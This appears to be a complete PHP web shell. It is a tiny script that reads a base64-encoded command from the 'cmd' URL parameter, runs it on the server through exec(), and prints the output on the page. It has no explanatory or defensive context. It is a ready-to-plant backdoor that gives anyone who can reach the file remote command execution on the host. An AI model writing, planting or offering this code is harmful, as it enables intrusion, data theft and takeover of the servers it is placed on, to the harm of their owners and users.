<?php
exec(base64_decode($_GET['cmd']), $output);
echo '<pre style="padding: 8px;">';
foreach($output as $line)
    echo $line . "\n";
echo '</pre>';
?>
